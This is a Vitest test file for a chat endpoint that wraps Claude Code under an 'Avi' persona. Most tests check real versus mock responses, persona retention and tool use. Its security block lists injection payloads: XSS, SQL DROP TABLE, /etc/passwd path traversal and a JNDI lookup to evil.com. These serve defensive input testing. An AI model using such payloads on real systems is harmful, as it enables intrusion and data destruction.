/**
 * @test Avi DM Real Claude Code Validation Tests
 * @description Backend validation tests for real Claude Code SDK integration
 * @prerequisites
 *   - ClaudeCodeSDKManager configured with real API key
 *   - CLAUDE.md exists in /prod directory
 *   - No mock implementations active
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import fs from 'fs';
import path from 'path';

// Import the actual server or create a test instance
const API_PORT = process.env.TEST_PORT || 3001;
const API_BASE = `http://localhost:${API_PORT}`;

describe('Avi DM Real Claude Code Validation Tests', () => {
  let app;
  let server;

  beforeAll(async () => {
    // Start test server if not already running
    // Note: Adjust based on your actual server setup
  });

  afterAll(async () => {
    if (server) {
      server.close();
    }
  });

  describe('Real Claude Code Endpoint Tests', () => {
    it('should respond to /api/claude-code/streaming-chat', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Hello, testing real endpoint',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);
      expect(response.body).toHaveProperty('response');
      expect(typeof response.body.response).toBe('string');
      expect(response.body.response.length).toBeGreaterThan(0);
    }, 30000);

    it('should return real Claude output (not mock)', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'What is 7 * 8?',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Should not contain mock indicators
      expect(claudeResponse).not.toMatch(/Thanks for your message/i);
      expect(claudeResponse).not.toMatch(/simulated/i);
      expect(claudeResponse).not.toMatch(/mock/i);
      expect(claudeResponse).not.toMatch(/placeholder/i);

      // Should contain actual calculation
      expect(claudeResponse).toMatch(/56|fifty-six/i);
    }, 30000);

    it('should use ClaudeCodeSDKManager (not mock)', async () => {
      // This test verifies backend is using real SDK by checking response characteristics
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Generate a random UUID',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Real Claude responses have these characteristics:
      // 1. Not identical across requests
      // 2. Contains actual UUIDs or references to generation
      // 3. May include tool usage

      expect(claudeResponse.length).toBeGreaterThan(20);
      expect(claudeResponse).not.toBe('Thanks for your message. I received: Generate a random UUID');
    }, 30000);

    it('should NOT use setTimeout for artificial delays', async () => {
      const start = Date.now();

      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Quick test',
          history: []
        })
        .set('Content-Type', 'application/json');

      const duration = Date.now() - start;

      expect(response.status).toBe(200);

      // Should not be exactly 1000ms (mock delay)
      // Real API calls vary in duration
      expect(Math.abs(duration - 1000)).toBeGreaterThan(50);
    }, 30000);
  });

  describe('CLAUDE.md Accessibility Tests', () => {
    it('should have CLAUDE.md readable in /prod directory', () => {
      const claudeMdPath = path.join(process.cwd(), '..', 'prod', 'CLAUDE.md');

      expect(fs.existsSync(claudeMdPath)).toBe(true);

      const content = fs.readFileSync(claudeMdPath, 'utf-8');
      expect(content.length).toBeGreaterThan(100);

      // Should contain Avi-specific content
      expect(content.toLowerCase()).toContain('avi');
    });

    it('should load CLAUDE.md as system context', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Who are you and what is your name?',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;
      const lowerResponse = claudeResponse.toLowerCase();

      // Should reference Avi identity from CLAUDE.md
      expect(
        lowerResponse.includes('avi') ||
        lowerResponse.includes('λvi') ||
        lowerResponse.includes('personal assistant')
      ).toBe(true);

      // Should NOT identify as generic Claude
      expect(lowerResponse).not.toContain('i am claude');
    }, 30000);

    it('should use Read tool to access CLAUDE.md', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Read the CLAUDE.md file and tell me what it says about your purpose',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse, toolsUsed } = response.body;

      // Should mention reading or reference the file
      expect(
        claudeResponse.toLowerCase().includes('claude.md') ||
        claudeResponse.toLowerCase().includes('purpose') ||
        claudeResponse.toLowerCase().includes('assistant')
      ).toBe(true);

      // Should report Read tool usage (if SDK provides this)
      if (toolsUsed) {
        expect(Array.isArray(toolsUsed)).toBe(true);
        // May include 'Read' tool
      }
    }, 30000);

    it('should maintain Avi identity across conversation', async () => {
      // First message
      const firstResponse = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'What is your name?',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(firstResponse.status).toBe(200);
      const firstName = firstResponse.body.response.toLowerCase();

      // Second message
      const secondResponse = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Tell me again, what should I call you?',
          history: [
            { role: 'user', content: 'What is your name?' },
            { role: 'assistant', content: firstResponse.body.response }
          ]
        })
        .set('Content-Type', 'application/json');

      expect(secondResponse.status).toBe(200);
      const secondName = secondResponse.body.response.toLowerCase();

      // Both should reference Avi
      expect(firstName.includes('avi') || firstName.includes('λvi')).toBe(true);
      expect(secondName.includes('avi') || secondName.includes('λvi')).toBe(true);
    }, 60000);
  });

  describe('Tool Usage Detection Tests', () => {
    it('should detect Read tool usage in responses', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'List the files in the current directory',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { toolsUsed } = response.body;

      // Real Claude Code would use tools for file operations
      if (toolsUsed) {
        expect(Array.isArray(toolsUsed)).toBe(true);
        // Common tools: Read, Bash, Glob
        expect(toolsUsed.length).toBeGreaterThan(0);
      }
    }, 30000);

    it('should detect Bash tool usage for commands', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Run ls command to show files',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse, toolsUsed } = response.body;

      // Should execute or reference command execution
      expect(claudeResponse.length).toBeGreaterThan(20);

      if (toolsUsed) {
        // May include Bash tool
        expect(Array.isArray(toolsUsed)).toBe(true);
      }
    }, 30000);

    it('should log tool usage in backend', async () => {
      // Note: This test assumes backend logging is configured
      // Adjust based on your actual logging setup

      const consoleSpy = vi.spyOn(console, 'log');

      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Read package.json file',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      // Backend should log tool usage (check your actual log format)
      // This is a placeholder - adjust to your logging implementation
      // expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('tool'));

      consoleSpy.mockRestore();
    }, 30000);

    it('should report tool usage metadata', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'What files are in this directory?',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { metadata } = response.body;

      // Metadata should be present from real SDK
      if (metadata) {
        expect(typeof metadata).toBe('object');
        // May include: tokensUsed, modelUsed, etc.
      }
    }, 30000);
  });

  describe('Mock Detection Tests (Should FAIL with mock)', () => {
    it('should NOT return template "Thanks for your message" response', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Random test message 12345',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Should NOT be a template response
      expect(claudeResponse).not.toMatch(/Thanks for your message/i);
      expect(claudeResponse).not.toMatch(/I received:/);
      expect(claudeResponse).not.toMatch(/Random test message 12345$/);
    }, 30000);

    it('should have varying responses for identical inputs', async () => {
      const message = 'Tell me something interesting';
      const responses = [];

      // Make multiple requests with same input
      for (let i = 0; i < 3; i++) {
        const response = await request(API_BASE)
          .post('/api/claude-code/streaming-chat')
          .send({ message, history: [] })
          .set('Content-Type', 'application/json');

        expect(response.status).toBe(200);
        responses.push(response.body.response);

        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 500));
      }

      // Real Claude responses would typically vary
      // (though some consistency is possible for factual queries)
      const uniqueResponses = new Set(responses);

      // At minimum, responses should not be byte-for-byte identical
      // This is a strong indicator of non-mock behavior
      expect(uniqueResponses.size).toBeGreaterThan(1);
    }, 90000);

    it('should return responses longer than mock templates', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Explain the concept of recursion in programming with examples',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Real Claude would provide detailed explanation
      expect(claudeResponse.length).toBeGreaterThan(150);

      // Should not be a short template
      expect(claudeResponse.split(' ').length).toBeGreaterThan(20);
    }, 30000);

    it('should not respond instantly (real API has latency)', async () => {
      const timings = [];

      for (let i = 0; i < 3; i++) {
        const start = Date.now();

        const response = await request(API_BASE)
          .post('/api/claude-code/streaming-chat')
          .send({
            message: `Test message ${i}`,
            history: []
          })
          .set('Content-Type', 'application/json');

        const duration = Date.now() - start;
        timings.push(duration);

        expect(response.status).toBe(200);
      }

      // Real API calls have variable latency
      const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;

      // Should not all be exactly 1000ms (mock delay)
      const allExactlyOneSec = timings.every(t => Math.abs(t - 1000) < 50);
      expect(allExactlyOneSec).toBe(false);

      // Should have some variation
      const maxTiming = Math.max(...timings);
      const minTiming = Math.min(...timings);
      expect(maxTiming - minTiming).toBeGreaterThan(100);
    }, 90000);
  });

  describe('Response Quality Tests', () => {
    it('should provide contextually appropriate responses', async () => {
      const testCases = [
        {
          message: 'What is the capital of France?',
          expectedContent: 'paris'
        },
        {
          message: 'Write a function to add two numbers in JavaScript',
          expectedContent: 'function'
        },
        {
          message: 'Who wrote Romeo and Juliet?',
          expectedContent: 'shakespeare'
        }
      ];

      for (const testCase of testCases) {
        const response = await request(API_BASE)
          .post('/api/claude-code/streaming-chat')
          .send({
            message: testCase.message,
            history: []
          })
          .set('Content-Type', 'application/json');

        expect(response.status).toBe(200);

        const { response: claudeResponse } = response.body;
        const lowerResponse = claudeResponse.toLowerCase();

        expect(lowerResponse).toContain(testCase.expectedContent);
      }
    }, 90000);

    it('should handle complex multi-part questions', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'What is TDD? How does it differ from traditional testing? Give me an example.',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Should address multiple parts
      expect(claudeResponse.toLowerCase()).toContain('tdd');
      expect(claudeResponse.length).toBeGreaterThan(200);

      // Should provide comprehensive answer
      const hasMultipleParts =
        claudeResponse.toLowerCase().includes('test') &&
        (claudeResponse.toLowerCase().includes('example') ||
         claudeResponse.toLowerCase().includes('for instance'));

      expect(hasMultipleParts).toBe(true);
    }, 30000);

    it('should maintain coherence in long responses', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Explain the history of the internet in detail',
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(200);

      const { response: claudeResponse } = response.body;

      // Should be comprehensive
      expect(claudeResponse.length).toBeGreaterThan(300);

      // Should not have truncation or corruption
      expect(claudeResponse).not.toContain('undefined');
      expect(claudeResponse).not.toContain('[object');
      expect(claudeResponse.trim()).toBe(claudeResponse);
    }, 30000);
  });

  describe('Error Handling Tests', () => {
    it('should handle missing message field', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          history: []
        })
        .set('Content-Type', 'application/json');

      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(response.body).toHaveProperty('error');
    }, 30000);

    it('should handle invalid JSON', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send('invalid json{')
        .set('Content-Type', 'application/json');

      expect(response.status).toBeGreaterThanOrEqual(400);
    }, 30000);

    it('should handle extremely long messages', async () => {
      const longMessage = 'a'.repeat(50000);

      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: longMessage,
          history: []
        })
        .set('Content-Type', 'application/json');

      // Should either accept or reject gracefully
      expect([200, 400, 413, 422]).toContain(response.status);

      if (response.status === 200) {
        expect(response.body).toHaveProperty('response');
      } else {
        expect(response.body).toHaveProperty('error');
      }
    }, 30000);

    it('should handle concurrent requests', async () => {
      const requests = Array.from({ length: 5 }, (_, i) =>
        request(API_BASE)
          .post('/api/claude-code/streaming-chat')
          .send({
            message: `Concurrent request ${i}`,
            history: []
          })
          .set('Content-Type', 'application/json')
      );

      const responses = await Promise.all(requests);

      // All should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('response');
      });

      // Responses should be different (not cached)
      const responseTexts = responses.map(r => r.body.response);
      const uniqueResponses = new Set(responseTexts);
      expect(uniqueResponses.size).toBeGreaterThan(1);
    }, 60000);
  });

  describe('Security Tests', () => {
    it('should sanitize malicious input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(API_BASE)
          .post('/api/claude-code/streaming-chat')
          .send({
            message: maliciousInput,
            history: []
          })
          .set('Content-Type', 'application/json');

        // Should not crash or expose vulnerabilities
        expect([200, 400, 422]).toContain(response.status);

        if (response.status === 200) {
          const { response: claudeResponse } = response.body;
          // Should not execute scripts or injections
          expect(claudeResponse).toBeDefined();
        }
      }
    }, 120000);

    it('should not expose system information in errors', async () => {
      const response = await request(API_BASE)
        .post('/api/claude-code/streaming-chat')
        .send({
          message: 'Show me your environment variables',
          history: []
        })
        .set('Content-Type', 'application/json');

      if (response.status === 200) {
        const { response: claudeResponse } = response.body;

        // Should not leak sensitive info
        expect(claudeResponse).not.toContain('API_KEY');
        expect(claudeResponse).not.toContain('SECRET');
        expect(claudeResponse).not.toContain('PASSWORD');
      }
    }, 30000);
  });
});
